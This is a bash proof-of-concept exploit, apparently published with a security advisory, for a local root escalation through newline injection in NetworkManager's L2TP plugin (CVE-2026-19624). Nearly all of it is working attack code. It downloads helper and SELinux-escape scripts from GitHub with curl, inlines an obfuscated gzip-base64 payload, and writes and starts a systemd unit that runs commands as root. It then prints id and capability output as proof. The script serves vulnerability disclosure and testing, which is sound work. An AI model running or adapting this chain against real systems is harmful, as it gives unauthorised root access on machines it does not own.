#!/usr/bin/env bash
#
# LinnemanLabs - nm-l2tp PoC - root exec from newline injection
#
# CVE-2026-19624
#
# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root
# https://github.com/linnemanlabs/advisories/
#
# end-to-end exploit, run from local login session
#
set -eu

# my test SUSE system doesnt add sbin to user paths
PATH="${PATH}:/sbin:/usr/sbin"
export PATH

cleanupNM() {
  echo "[*] cleaning up NM connections"
  nmcli -t -f UUID,NAME connection show | awk -F ':' '$2=="linnemanlabs-poc"{print $1}' | xargs -r -n1 nmcli connection delete
}

# check what ipsec daemon is installed
ipd="$( ipsec version )"

# selinux matters for the staging and post-exploitation work
selinux=false
if [ -f /etc/selinux/config ];then
  selinux=true
  echo "[*] selinux detected"
  enforcing="$( /usr/sbin/getenforce || true )"
  if [ "${enforcing}" == "Enforcing" ];then
    echo "[*] selinux enforcing, will stage properly and escape"
  else
    echo "[*] selinx not enforcing, will stage properly and escape anyway, why not"
  fi
fi

# this is where the AppArmor checks would go...
# if AppArmor did anything and we needed to care if it was enabled

# prepare payload
payloadfile="/tmp/x.sh"
payload="/bin/sh /tmp/x.sh"
outfile=""
if [ "${selinux}" == "true" ];then
  # check if we can do the container_file_t trick
  # cft="$( sesearch -A -s ipsec_mgmt_t -t container_file_t -c file -p open,read -Sp 2>/dev/null )"
  # if [[ "${cft}" == "allow ipsec_mgmt_t logfile"* ]];then
  # unpriv user cant check selinux policy status on some systems, use package installation status instead
  # csl="$( rpm -qa container-selinux )"
  slt="$( grep "^SELINUXTYPE=" /etc/selinux/config | tail -1 | awk -F '=' '{ print $2 }' )"
  echo "[*] SELinux policy: ${slt}"
  # no reliable way for unpriv user to confirm that container-selinux grant is in effect, but the package provides it
  # only works on targeted, not mls
  # just in-lining always, no reason not to
  # if [[ "${csl}" == *"container-selinux"* ]] && [ "${slt}" != "mls" ];then
  #   echo "[*] staging payload as container_file_t for ipsec_mgmt_t"
  #   # stage systemd activation-pull selinux escape
  #   # see https://linnemanlabs.com/posts/confined-root-is-still-root/
  #   if [ ! -f activation-pull.sh ];then
  #     echo "[*] missing activation-pull.sh, pulling from github"
  #     curl -s -o "activation-pull.sh" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/selinux/confined-root-is-still-root/activation-pull.sh"
  #   fi
  #   cp "activation-pull.sh" "${payloadfile}"
  #   chcon -t container_file_t "${payloadfile}"
  #   chmod 755 "${payloadfile}"
  #   echo "[*] staged selinux escape (activation-pull)"
  #   outfile="/tmp/ipsec.out-$( date +%s )"
  #   CMD="umask 0000;{ id; grep ^Cap /proc/self/status; } > ${outfile};chcon -t user_tmp_t ${outfile}"
  #   payload="\"CMD='${CMD}' /bin/sh /tmp/x.sh > /tmp/debug.log\""
  # else
    echo "[*] in-lining payload"
    # systemd activation-pull selinux escape
    # see https://linnemanlabs.com/posts/confined-root-is-still-root/
    if [ ! -f activation-pull.sh ];then
      echo "[*] missing activation-pull.sh, pulling from github"
      curl -s -o "activation-pull.sh" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/selinux/confined-root-is-still-root/activation-pull.sh"
    fi
    b64p="$( cat activation-pull.sh | gzip | base64 -w0 )"
    outfile="/tmp/ipsec.out-$( date +%s )"
    payload="\"BCMD='${b64p}';umask 0000;echo \${BCMD} | base64 -d | gzip -d | CMD='{ id; grep ^Cap /proc/self/status; } > ${outfile}' /bin/sh;chcon -t user_tmp_t ${outfile}\""
  # fi
else
  # not selinux, stage a systemd unit file to get full caps
  echo "[*] staging payload to escalate through systemd unit file"
  outfile="/tmp/ipsec.out-$( date +%s ).txt"
  cat > "${payloadfile}" <<EOF
#!/bin/bash

cat > /etc/systemd/system/linnemanlabs-l2tp-poc.service <<'EOF2'
[Unit]
Description=LinnemanLabs l2tp POC

[Service]
ExecStart=/bin/sh -c "umask 0000;{ id; cat /proc/self/attr/current; grep ^Cap /proc/self/status; } > ${outfile}"
Type=oneshot
Restart=never
EOF2

systemctl daemon-reload
systemctl start linnemanlabs-l2tp-poc
EOF
fi

# strongswan needs a real responder and leftikeport, old libreswan needs full responder
if [[ "${ipd}" == *"Libreswan 5."* ]];then
  echo "[*] ipsec daemon is libreswan 5.x, skipping responder"
else
  echo "[*] starting responder in background"
  if [ ! -f nm-l2tp-responder.py ];then
    echo "[*] missing nm-l2tp-responder.py, pulling from github.com/linnemanlabs/advisories"
    curl -s -o "nm-l2tp-responder.py" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/nm-l2tp/nm-l2tp-responder.py"
  fi
  python3 nm-l2tp-responder.py &
  trap 'echo "[*] killing nm-l2tp-responder" && pkill -f nm-l2tp-resp' EXIT
  sleep 2
fi

# fire injection
if [ ! -f "./nm-l2tp-inject.py" ];then
  echo "[-] missing nm-l2tp-inject.py"
  exit 1
fi
echo "[*] running injection"

POC_LEFTUPDOWN="${payload}" python3 nm-l2tp-inject.py
trap 'cleanupNM' EXIT

# check results
echo "[*] finished injection, waiting for output logs ${outfile}"
waits=5;waitc=0
until [ -f "${outfile}" ]
do
  if [ "${waitc}" -gt 15 ];then
    echo "[-] slept 15 cycles.. no log file. did you change payload? patched nm-l2tp ver? check journalctl"
    exit 1
  fi
  echo "[*] Waiting for log file.."
  sleep ${waits}
  ((++waitc))
done

echo "[+] log created:"
cat "${outfile}"

echo "[*] done"
